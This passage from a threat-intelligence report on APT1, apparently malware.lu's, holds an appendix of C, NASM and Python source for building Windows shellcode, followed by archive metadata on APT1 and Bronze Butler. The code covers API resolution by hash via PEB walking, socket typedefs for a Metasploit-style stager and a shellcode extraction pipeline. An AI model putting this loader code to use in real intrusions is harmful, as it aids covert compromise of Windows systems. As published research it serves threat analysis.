SOCKET s,\n struct sockaddr *addr,\n int *addrlen\n);\ntypedef int (CALLBACK *sbind)(\n SOCKET s,\n const struct sockaddr *name,\n int namelen\n);\n// MSF init RelfctiveDllInjection\ntypedef int (CALLBACK* sInit)(\n    SOCKET s\n);\ntypedef struct {\n    short  sin_family;\n    u_short sin_port;\n    struct in_addr sin_addr;\n    char  sin_zero[8];\n} sockaddr_in;\n#endif\n\n```\nwinutils.h:\n```\n#ifndef __WINUTILS__\n#define __WINUTILS__\n#include \"hashlib.h\"\nHMODULE get_kernel32(void);\nvoid *getprocaddr(HMODULE module, char *func_name);\nvoid *getprocaddrbyhash(HMODULE module, unsigned int hash);\nint strcmp(char*, char*);\nint strlen(char*);\n#endif\n\n```\nhashlib.h:\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 42 f 48\n\n\n-----\n\n```\n#ifndef __HASHLIB__\n#define __HASHLIB__\nunsigned int FNV1HashStr(char *buffer);\n#endif\n\n```\ngethash.c:\n```\n#include <stdio.h>\n#include \"hashlib.h\"\nint main(int argc, char *argv[]){\n   unsigned int hash = 0;\n   if (argc != 2){\n      fprintf(stderr, \"%s string\\n\", argv[0]);\n      return 1;\n   }\n   hash = FNV1HashStr(argv[1]);\n   printf(\"0x%08x\\n\", hash);\n   return 0;\n}\n\n```\nhash.asm:\n```\nsection .text\n%define buffer [ebp+8]\n%define offset_basis 2166136261\n; http://forum.nasm.us/index.php?topic=874.0\nglobal FNV1HashStr\nFNV1HashStr:\n  push ebp          ; set up stack frame\n  mov ebp, esp\n  push esi          ; save registers used\n  push edi\n  push ebx\n  push ecx\n  push edx\n  mov esi, buffer      ;esi = ptr to buffer\n  mov eax, offset_basis   ;set to 2166136261 for FNV-1\n  mov edi, 1000193h     ;FNV_32_PRIME = 16777619\n  xor ebx, ebx        ;ebx = 0\nnextbyte:\n  mul edi          ;eax = eax * FNV_32_PRIME\n  mov bl, [esi]       ;bl = byte from esi\n  xor eax, ebx        ;al = al xor bl\n  inc esi          ;esi = esi + 1 (buffer pos)\n  cmp byte [esi], 0\n  jnz nextbyte        ;if ecx != 0, jmp to NextByte\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 43 f 48\n\n\n-----\n\n```\n  pop edx          ; restore registers\n  pop ecx\n  pop ebx\n  pop edi\n  pop esi\n  mov esp, ebp        ; restore stack frame\n  pop ebp\n  ret             ; eax = fnv1 hash\n\n```\nwinutils.asm:\n```\nsection .text\nglobal get_kernel32\nglobal getprocaddr\nglobal getprocaddrbyhash\nglobal strcmp\nglobal strlen\nextern FNV1HashStr\nget_kernel32:\n    push ebp\n    mov ebp, esp\n    mov ecx, [fs: 0x30] ; pointer to PEB\n    mov ecx, [ecx + 0xc] ; get PEB->Ldr\n    mov ecx, [ecx + 0x14] ; get PEB->Ldr.InMemoryOrderModuleList.Flink (1st \n               entry)\n    next_module:\n       mov ecx, [ecx]  ; 2nd Entry, start check at second entry 1st is\n                main module\n       mov esi, [ecx + 0x28] ; get module name\n       cmp word [esi + 12*2], 0 ; check len 12 for kernel32\n       jne next_module\n    mov eax, [ecx + 0x10]  ; Get Kernel32 Base\n    cmp word [eax], 'MZ'  ; check for MZ\n    je get_kernel32_end\n    xor eax, eax\nget_kernel32_end:\n    mov esp, ebp\n    pop ebp\n    ret\ngetprocaddrbyhash:\n    push ebp\n    mov ebp, esp\n    sub esp, 12 ; 3 DWORD\n    push ebx\n    ; verify MZ and PE headers\n    mov ebx, [ebp + 0x08] ; get arg1\n    cmp word [ebx], 'MZ'\n    jne getprocaddrbyhash_failed ; check for MZ\n    add ebx, [ebx + 0x3C] \n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 44 f 48\n\n\n-----\n\n```\n    ;cmp word [ebx], 'PE'\n    ;jne getprocaddrbyhash_failed ; check for PE\n    mov  [ebp - 0x0C], edx  ; save the PE header\n    ; find the real addr of the EAT\n    mov  eax, [ebx + 0x78]  ; OptionalHeader.\n                  DataDirectory[0].VirtualAddress\n    add  eax, dword [ebp + 0x08] ; add the offset to the base address\n    mov  [ebp - 0x08], eax  ; save it!\n    ; find the real address of export names\n    mov  eax, [eax + 0x20]  ; eax is still addr of EAT (0x20 = offset to \n                               ADdressOfNames)\n    add  eax, dword [ebp + 0x08]\n    mov  [ebp - 0x04], eax ; save it!\n  ; start looking for names!\n    xor ecx, ecx\n    getprocaddrbyhash_loop_names:\n       mov  edx, [ebp - 0x08]  ; EAT\n       cmp  ecx, [edx + 0x18]  ; NumberOfNames\n       jge getprocaddrbyhash_failed ; not find we failed\n       ; find the address of the function name\n       mov  ebx, [ebp - 0x04]  ; AddressOfNames\n       mov  ebx, [ebx + ecx * 4]  ; RVA of string\n       add  ebx, [ebp + 0x08]\n       ; compare 'em!\n       ;push dword [ebp + 0x0C]  ; FunctionName\n       push  ebx   ; name of entry\n       call  FNV1HashStr\n       add esp, 4\n       cmp  eax, dword [ebp + 0x0C]\n       je  getprocaddrbyhash_found_api\n       inc  ecx\n       jmp  getprocaddrbyhash_loop_names\ngetprocaddrbyhash_found_api:\n    ;-----------------------------------------------------    ; success! now all that's left is to go from the\n    ; AddressOfNames index to the AddressOfFunctions index\n    ; ----------------------------------------------------    ; First thing's first, find the AddressOfNameOrdinals address\n    mov  eax, [ebp - 0x08]\n    mov  eax, [eax + 0x24] ; AddressOfNameOrdinals offset\n    add  eax, [ebp + 0x08]\n    ; Now we gotta look up the ordinal corresponding to our api\n    xor  ebx, ebx\n    mov  bx, [eax + ecx * 2] ; ecx * 2 because it's an array of WORDS\n    ; Next we find the AddressOfFunctions array\n    mov  eax, [ebp - 0x08]\n    mov  eax, [eax + 0x1C] ; AddressOfFunctions offset\n    add  eax, [ebp + 0x08]\n    ; and last we find the address of our api!\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 45 f 48\n\n\n-----\n\n```\n    mov  eax, [eax + ebx * 4]\n    add  eax, [ebp + 0x08]\n    jmp getprocaddrbyhash_end\ngetprocaddrbyhash_failed:\n    xor eax, eax\ngetprocaddrbyhash_end:\n    pop ebx\n    mov esp, ebp\n    pop ebp\n    ret\n\n```\ngen_conf.py:\n```\nimport struct\nstruct_global = '''#ifndef __GLOBAL__\n#define __GLOBAL__\n#include \"fct.h\"\ntypedef struct {\n  %s\n  sVirtualAlloc VirtualAlloc;\n  sLoadLibraryA LoadLibraryA;\n  sclosesocket closesocket;\n  sgetsockname getsockname;\n  srecv recv;\n  sWSAStartup WSAStartup;\n  ssocket socket;\n  slisten listen;\n  sbind bind;\n  saccept accept;\n} s_config;\nvoid init_config(s_config *config);\n#endif\n'''\nconfig = {\n  'sws32' : { 'value': \"ws2_32.dll\", 'type' : \"char\", },\n}\nfilename_header = \"global.h\"\nfilename_source = \"global.c\"\ndef xor(data, key):\n  #ret = ''\n  #for i in range(len(data)):\n    #c = ord(data[i]) ^ ord(key[i%len(key)])\n    #ret += chr(c)\n  return ret\ndef stack(var, name, value, key = None):\n  ret = ''\n  l = len(value)\n  for i in range (0, l, 4):\n    v = value[i:i+4]\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 46 f 48\n\n\n-----\n\n```\n    v = struct.unpack('I', v)[0]\n    ret += \"*(unsigned int *)(%s->%s + %d) = %d;\\n\" % (var, name, i, v)\n  ret += \"%s->%s_len = %d;\\n\" % ( var, name, len(value.strip('\\00')))\n  return ret\ndef gen_source(conf, header):\n  source = \"\"\"#include \"%s\"\ninline void init_config(s_config *config){\n\"\"\" % (header)\n  for k, v in conf.items():\n    #if k != 'key':\n      #source += stack('config', k, v['value'], config['key']['value'])\n    #else:\n    source += stack('config', k, v['value'])\n  source += \"}\"\n  return source\ndef gen_header(conf):\n  h = ''\n  for k, v in conf.items():\n    if v['type'] == 'char':\n      h += \"%s %s[%d];\\n\" % ( v['type'], k, len(v['value']) )\n      h += \"unsigned int %s_len;\\n\" % ( k )\n  ret = struct_global % h\n  return ret\ndef prepare_config(conf):\n  for key, value in conf.items():\n    #if key != 'key':\n      #value['value'] = xor(value['value'], conf['key']['value']) + \"\\x00\"\n    l = len(value['value'])\n    if l % 4 != 0:\n      value['value'] += \"\\x00\" * (4-(l%4))\n    conf[key] = value\n  return conf\nconfig = prepare_config(config)\nsource = gen_source(config, filename_header)\nheader = gen_header(config)\nopen(filename_source,'w').write(source)\nopen(filename_header,'w').write(header)\n\n```\nshellcode.py\n```\nimport subprocess\nimport sys\ndef extract_shellcode(f):\n  ret = ''\n  cmd = \"i486-mingw32-objdump -s %s | tail -n+5\" % (f)\n  data = subprocess.check_output(cmd, shell=True, stderr=None)\n  data = data.split(\"Contents of section \")[0].strip('\\n')\n  lines = data.split('\\n')\n  for l in lines:\n    cols = l.split(' ')\n    ret += cols[2] + cols[3] + cols[4] + cols[5]\n  return ret.decode('hex')[:-0x10]\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 47 f 48\n\n\n-----\n\n```\nif __name__ == \"__main__\":\n  shellcode = extract_shellcode(sys.argv[1])\n  sys.stdout.write(shellcode)\n\n```\nMakefile:\n```\nBIN_WIN = global.c main.exe shellcode.bin\nCC_WIN = i486-mingw32-gcc\nLD_WIN = i486-mingw32-ld\nSTRIP_WIN = i486-mingw32-strip\nCFLAGS_WIN = -Os -pie # -falign-functions=1 -falign-loops=1 -falign-jumps=1\nLDFLAGS_WIN = --dynamicbase --nxcompat --enable-stdcall-fixup\nAC = nasm\nAFLAGS_WIN = -f win32 --prefix _ # nasm flag\nall: $(BIN_WIN)\nglobal.c:\n    python gen_conf.py\n    #astyle global.h global.c\n%.obj: %.asm\n    $(AC) $(AFLAGS_WIN) -o $@ $<\n%.obj: %.c\n    $(CC_WIN) -o $@ $(CFLAGS_WIN) -c $<\nmain.exe: main.obj global.obj winutils.obj hash.obj\n    $(LD_WIN) $(LDFLAGS_WIN) -e __main --subsystem windows -o $@ $^\n    $(STRIP_WIN) $^\nshellcode.bin: main.exe\n    python shellcode.py main.exe > shellcode.bin\nc:\n    rm -f *.o *.obj\nclean:\n    rm -f *.o *.obj $(BIN) $(BIN_WIN)\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 48 f 48\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/x2jgr4j1bgfas2h2b4h09mam9nn4qwu3",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2013/2013.03.27.APT1_technical_backstage/RAP002_APT1_Technical_backstage.1.0.pdf",
        "https://malware.lu/assets/files/articles/RAP002_APT1_Technical_backstage.1.0.pdf"
    ],
    "report_names": [
        "RAP002_APT1_Technical_backstage.1.0",
        "RAP002_APT1_Technical_backstage.1.0.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bbefc37d-475c-4d4d-b80b-7a55f896de82",
            "created_at": "2022-10-25T15:50:23.571783Z",
            "updated_at": "2025-03-27T02:00:55.502112Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "BRONZE BUTLER",
                "REDBALDKNIGHT"
            ],
            "source_name": "MITRE:BRONZE BUTLER",
            "tools": [
                "Mimikatz",
                "build_downer",
                "cmd",
                "ABK",
                "at",
                "BBK",
                "schtasks",
                "down_new",
                "Daserf",
                "ShadowPad",
                "Windows Credential Editor",
                "gsecdump"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "dabb6779-f72e-40ca-90b7-1810ef08654d",
            "created_at": "2022-10-25T15:50:23.463113Z",
            "updated_at": "2025-03-27T02:00:55.47619Z",
            "deleted_at": null,
            "main_name": "APT1",
            "aliases": [
                "APT1",
                "Comment Crew",
                "Comment Group",
                "Comment Panda"
            ],
            "source_name": "MITRE:APT1",
            "tools": [
                "Seasalt",
                "ipconfig",
                "Cachedump",
                "PsExec",
                "GLOOXMAIL",
                "Lslsass",
                "PoisonIvy",
                "WEBC2",
                "Mimikatz",
                "gsecdump",
                "Pass-The-Hash Toolkit",
                "Tasklist",
                "xCmd",
                "pwdump"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "cf7fc640-acfe-41c4-9f3d-5515d53a3ffb",
            "created_at": "2023-01-06T13:46:38.228042Z",
            "updated_at": "2025-03-27T02:00:02.775905Z",
            "deleted_at": null,
            "main_name": "APT1",
            "aliases": [
                "GIF89a",
                "G0006",
                "PLA Unit 61398",
                "Group 3",
                "TG-8223",
                "Comment Group",
                "ShadyRAT",
                "COMMENT PANDA",
                "Comment Crew",
                "Byzantine Candor",
                "Brown Fox"
            ],
            "source_name": "MISPGALAXY:APT1",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1666716500,
    "ts_updated_at": 1743041761,
    "ts_creation_date": 1364373157,
    "ts_modification_date": 1364373157,
    "files": {
        "pdf": "https://archive.orkl.eu/26353a7703ce0b186450134a5321ac37d1405380.pdf",
        "text": "https://archive.orkl.eu/26353a7703ce0b186450134a5321ac37d1405380.txt",
        "img": "https://archive.orkl.eu/26353a7703ce0b186450134a5321ac37d1405380.jpg"
    }
}